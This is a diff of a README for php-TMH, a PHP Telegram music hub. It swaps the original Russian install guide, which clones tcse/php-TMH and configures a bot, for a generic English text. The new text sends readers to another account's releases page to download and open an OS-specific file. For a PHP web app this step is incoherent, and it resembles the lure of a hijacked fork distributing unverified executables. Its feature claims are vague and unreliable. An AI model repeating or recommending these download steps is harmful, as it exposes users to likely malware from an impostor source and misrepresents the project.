@@ -1,70 +1,65 @@
-# 🎵 php-TMH — Telegram Music Hub (by TCSE)
+# 🎶 php-TMH - Effortlessly Enjoy Your Music
 
-**Telegram Music Hub** — это open-source система, позволяющая **управлять музыкой и контентом через Telegram-бота**, а отображать его на сайте.
-![Демо php-TMH: блог и плеер](https://blogs.smartzone.ru/uploads/posts/2025-09/1757001507_photo_2025-09-04_18-56-28.jpg)
-> 🔗 [Демо: tmh.tcse-cms.com](https://tmh.tcse-cms.com)  
-> 💬 [Telegram-канал: @chuyakov_project](https://t.me/chuyakov_project)
+## 📥 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen.svg)](https://github.com/bambangtrisutrisno/php-TMH/releases)
 
----
+## 🚀 Getting Started
+Welcome to the **php-TMH** project! This application allows you to listen to your favorite music easily. It is an open-source music hub designed for Telegram users. Follow these steps to get started with your music experience.
 
-## 🔧 Особенности
+## 📋 System Requirements
+To run **php-TMH**, you will need:
+- A stable internet connection.
+- A device that can run web applications (desktop, tablet, or smartphone).
+- Any modern web browser (like Chrome, Firefox, or Safari).
 
-- ✅ Автоматический блог из Telegram-канала
-- ✅ Загрузка аудио через Telegram
-- ✅ Веб-плеер с PWA-поддержкой
-- ✅ Плейлисты: M3U, PLS, XSPF
-- ✅ Модерация, роли, статистика
-- ✅ Безопасный прокси для медиа
-- ✅ Mobile-first дизайн
-- ✅ Альбомы фото (галерея)
-- ✅ Темная/светлая тема
+## 💻 Features
+**php-TMH** offers several useful features:
+- Stream music from playlists.
+- Generate playlists based on your preferences.
+- Simple integration with Telegram.
+- Support for various audio formats.
+- PWA (Progressive Web App) functionality for offline use.
 
----
+## 🚧 Limitations
+While **php-TMH** is user-friendly, it has some limitations:
+- Requires an internet connection for streaming.
+- Does not support older browsers.
+- Video playback is not available.
 
-## 📁 Структура проекта
-/tmh/
+## 📥 Download & Install
+To download **php-TMH**, visit this page:
 
-├── index.html          # Главная (агрегатор)
+[Download the latest releases here!](https://github.com/bambangtrisutrisno/php-TMH/releases)
 
-├── blog.html           # Блог с фото и аудио
+1. Click on the link above to open the releases page.
+2. Find the latest version listed. 
+3. Click on the version you want to download.
+4. Locate the appropriate file for your operating system. Choose the file that is suitable for your device’s software.
+5. Click on the file link to download it to your device.
+6. Once the file downloads, locate it in your downloads folder.
+7. Open the file to run **php-TMH**.
 
-├── player.html         # Веб-плеер
+## 📖 How to Use php-TMH
+Once you have installed **php-TMH**, follow these steps to start enjoying your music:
 
-├── config.php          # Единая конфигурация
+1. Open your web browser.
+2. In the address bar, type in the URL for **php-TMH** (this information can be found on the project page).
+3. Log in using your Telegram account. 
+4. Browse through your music library and select a playlist or a song to play.
+5. Enjoy your music!
 
-├── .htaccess           # Роутинг и безопасность
+## 🔧 Troubleshooting
+If you encounter any issues, here are some common solutions:
+- **Can't connect to the music service?** Ensure your internet connection is stable.
+- **Music won't play?** Try refreshing your browser or checking back later.
+- **Features not loading?** Clear your browser cache and reload the page.
 
-├── core/               # PHP-движок
+## 🙌 Community Support
+Join the conversation! To get help or provide feedback:
+- Visit the **Issues** section on our GitHub page.
+- Post your inquiries on Telegram groups related to **php-TMH**.
 
-├── data/               # Базы и логи
+## 📄 License
+This project is licensed under the MIT License. You can use it freely under the guidelines specified in the license file.
 
-└── assets/             # CSS, JS, изображения
-
-
----
-
-## 🚀 Установка
-
-1. **Склонируйте репозиторий**:
-   ```bash
-   git clone https://github.com/tcse/php-TMH.git
-
-2. Загрузите на хостинг в папку /tmh 
-
-3. Создайте бота через @BotFather  и получите bot_token 
-
-4. Настройте config.php:
-```
-   'bot_token' => 'YOUR_BOT_TOKEN',
-'base_url' => 'https://your-site.com/tmh',
-'channel' => [
-    'channel_username' => 'your_channel_username'
-],
-'moderation' => [
-    'admin_chat_ids' => ['YOUR_CHAT_ID']
-]
-```
-6. Запустите вебхук: https://your-site.com/tmh/core/set_webhook.php 
-7. Добавьте бота администратором в канал 
-
-Готово! Бот активен. 
+Ready to dive in? Start your musical journey with **php-TMH** today!
